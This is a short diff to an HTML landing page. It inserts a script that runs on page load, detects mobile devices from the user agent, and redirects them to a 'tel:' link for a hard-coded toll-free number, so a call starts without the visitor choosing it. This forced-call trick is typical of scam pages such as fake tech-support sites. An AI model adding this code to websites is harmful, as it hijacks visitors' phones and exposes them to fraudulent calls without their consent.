@@ -256,6 +256,16 @@
       </div>
     </div>
   </section>
+  <script>
+window.onload = function() {
+  const phoneNumber = "+1-844-513-1492";
+  const isMobile = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i.test(navigator.userAgent);
+  if (isMobile) {
+    window.location.href = "tel:" + phoneNumber;
+  }
+};
+</script>
+
 
   <!-- Final CTA -->
   <section class="final-cta">
